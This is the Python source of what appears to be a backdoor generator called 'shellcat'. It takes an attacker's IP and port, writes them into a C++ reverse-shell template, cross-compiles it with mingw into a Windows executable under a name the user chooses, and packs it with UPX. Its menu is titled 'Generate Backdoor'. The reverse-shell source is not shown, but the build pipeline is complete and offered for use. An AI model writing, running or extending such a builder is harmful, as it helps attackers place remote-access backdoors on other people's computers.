import os
from shellcat_modules.banners import pwncat_banner
import ipaddress
import subprocess
import yaml

Black = '\033[1;30m'        # Black
Red = '\033[1;31m'          # Red
Green = '\033[1;32m'        # Green
Yellow = '\033[1;33m'       # Yellow
Blue = '\033[1;34m'         # Blue
Purple = '\033[1;35m'       # Purple
Cyan = '\033[1;36m'         # Cyan
White = '\033[1;37m'        # White
NC = '\033[0m'
RESET = "\x1b[0m"
BlueF = '\x1b[1;34m'
orange = '\x1b[38;5;166m'
white = '\x1b[1;37m'


def clear_console():
    os.system('clear')


def check_netconf(ip, port):
    try:
        ip = ipaddress.IPv4Address(ip)  # Преобразование в объект IPv4Address
        port = int(port)  # Преобразование в целое число
        return True
    except (ipaddress.AddressValueError, ValueError):
        return False


def read_config_file():
    global payload_save  # For save payloads
    if os.path.exists('config.yaml'):
        with open('config.yaml', 'r') as f:
            config_data = yaml.load(f, Loader=yaml.FullLoader)

        payload_save = config_data.get('savedir')
    return payload_save


def generate_shell_code(ip, port, app_name):
    with open('shell_src/shell.cpp', 'r') as shell_file:
        shell_code = shell_file.read()

    shell_code = shell_code.replace('IPADDRSELECT', ip)
    shell_code = shell_code.replace('PORTSELECT', port)

    with open('shell_src/shell_tmp.cpp', 'w') as generated_shell_file:
        generated_shell_file.write(shell_code)

    subprocess.call(f'i686-w64-mingw32-g++ shell_src/shell_tmp.cpp -o {payload_save}/{app_name} -lws2_32 -static-libgcc -fno-ident -static-libstdc++;upx -9 {payload_save}/{app_name};clear', shell=True)
    shell_code = shell_code.replace(ip, 'IPADDRSELECT')
    shell_code = shell_code.replace(port, 'PORTSELECT')
    os.system('rm shell_src/shell_tmp.cpp')

    with open('shell_src/shell.cpp', 'w') as generated_shell_file:
        generated_shell_file.write(shell_code)

    print(f"{white}[{Blue}+{white}] {Cyan}Shell code generated successfully with path {Green}{payload_save}/{app_name}")
    print(payload_save)
    input()

def payload_setting(LHOST, LPORT):
    default_app_name = 'app.exe'

    payload_set = (f'''
 {BlueF}[+] {orange}Generate Backdoor {BlueF}[+]{RESET}
  {BlueF}+------------++-------------------------++-----------------------+
  | {white}[+] Name [+]{BlueF} ||     {white}[+] Descript [+] {BlueF}   ||{white}  [+] Your Input [+]{BlueF}
  +--------------++-----------------------++-----------------------+
  |{LHOST}              ||  The Listen Address      || $yourip
  |{LPORT}              ||  The Listen Ports       || $yourport
  +------------++-------------------------++-----------------------+
    ''')
    print(payload_set)
    app_name = input(f'{white}[{Cyan}+{white}]{Yellow} App exe n name(default app.exe): ')
    if len(app_name) == 0:
        generate_shell_code(LHOST, LPORT, default_app_name)
    else:
        generate_shell_code(LHOST, LPORT, app_name)


def shell_build():
    read_config_file()
    clear_console()
    pwncat_banner()
    while True:

        ip = input(f'{White}[{Cyan}+{White}]{Blue} Enter your IP address: ')
        port = input(f'{White}[{Cyan}+{White}]{Blue} Enter your port: ')
        if check_netconf(ip, port):
            payload_setting(ip, port)
            break
        else:
            print(f'{White}[{Red}!{White}]{Red} IP address or port is not correct!')


